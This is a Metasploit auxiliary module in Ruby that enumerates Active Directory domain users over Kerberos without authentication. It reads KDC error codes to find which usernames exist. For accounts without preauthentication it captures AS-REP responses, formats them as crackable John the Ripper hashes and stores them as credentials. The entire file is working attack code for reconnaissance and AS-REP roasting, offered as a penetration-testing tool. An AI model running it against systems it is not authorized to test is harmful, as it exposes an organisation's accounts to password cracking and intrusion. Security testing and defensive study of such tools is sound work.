##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Domain User Enumeration',
        'Description' => %q{
          This module will enumerate valid Domain Users via Kerberos from an unauthenticated perspective. It utilizes
          the different responses returned by the service for valid and invalid users.
        },
        'Author' => [
          'Matt Byrne <attackdebris[at]gmail.com>', # Original Metasploit module
          'alanfoster' # Enhancements
        ],
        'References' => [
          ['URL', 'https://nmap.org/nsedoc/scripts/krb5-enum-users.html']
        ],
        'License' => MSF_LICENSE
      )
    )

    register_options(
      [
        OptString.new('DOMAIN', [ true, 'The Domain Eg: demo.local' ]),
        OptPath.new(
          'USER_FILE',
          [true, 'Files containing usernames, one per line', nil]
        )
      ],
      self.class
    )
  end

  def user_list
    if File.readable? datastore['USER_FILE']
      users = File.new(datastore['USER_FILE']).readlines(chomp: true)
      users.each(&:downcase!)
      users.uniq!
    else
      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
    end
    users
  end

  def run
    domain = datastore['DOMAIN'].upcase
    print_status("Using domain: #{domain} - #{peer}...")

    pre_auth = []
    pre_auth << build_pa_pac_request
    pre_auth

    user_list.each do |user|
      next if user.empty?

      begin
        res = send_request_as(
          client_name: user.to_s,
          server_name: "krbtgt/#{domain}",
          realm: domain.to_s,
          pa_data: pre_auth
        )
      rescue ::EOFError => e
        print_error("#{peer} - User: #{user.inspect} - EOF Error #{e.message}. Aborting...")
        elog(e)
        # Stop further requests entirely
        return false
      rescue Rex::Proto::Kerberos::Model::Error::KerberosDecodingError => e
        print_error("#{peer} - User: #{user.inspect} - Decoding Error -  #{e.message}. Aborting...")
        elog(e)
        # Stop further requests entirely
        return false
      end

      case res.msg_type
      when Rex::Proto::Kerberos::Model::AS_REP
        hash = format_asrep_to_john_hash(res)

        # Accounts that have 'Do not require Kerberos preauthentication' enabled, will receive an ASREP response with a ticket present
        print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
        report_cred(
          user: user,
          asrep: hash
        )
      when Rex::Proto::Kerberos::Model::KRB_ERROR
        if res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
          print_good("#{peer} - User: #{user.inspect} is present")
          report_cred(user: user)
        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CLIENT_REVOKED
          print_error("#{peer} - User: #{user.inspect} account disabled or locked out")
        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_C_PRINCIPAL_UNKNOWN
          vprint_status("#{peer} - User: #{user.inspect} user not found")
        elsif res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_WRONG_REALM
          print_error("#{peer} - User: #{user.inspect} - #{res.error_code}. Domain option may be incorrect. Aborting...")
          # Stop further requests entirely
          return false
        else
          vprint_status("#{peer} - User: #{user.inspect} - #{res.error_code}")
        end
      else
        vprint_status("#{peer} - User: #{user.inspect} - #{res.error_code}. Unknown response #{res.msg_type.inspect}")
      end
    end
  end

  def report_cred(opts)
    domain = datastore['DOMAIN'].upcase

    service_data = {
      address: rhost,
      port: rport,
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      service_name: 'kerberos',
      realm_key: ::Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain
    }

    credential_data = {
      username: opts[:user],
      origin_type: :service,
      module_fullname: fullname
    }.merge(service_data)

    if opts[:asrep]
      credential_data.merge!(
        private_data: opts[:asrep],
        private_type: :nonreplayable_hash,
        jtr_format: 'krb5'
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # @param [Rex::Proto::Kerberos::Model::KdcResponse] asrep The krb5 asrep response
  # @return [String] A valid string format which can be cracked offline
  def format_asrep_to_john_hash(asrep)
    "$krb5asrep$#{asrep.enc_part.etype}$#{asrep.cname.name_string.join('/')}@#{asrep.ticket.realm}:#{asrep.enc_part.cipher[0...16].unpack1('H*')}$#{asrep.enc_part.cipher[16..].unpack1('H*')}"
  end
end
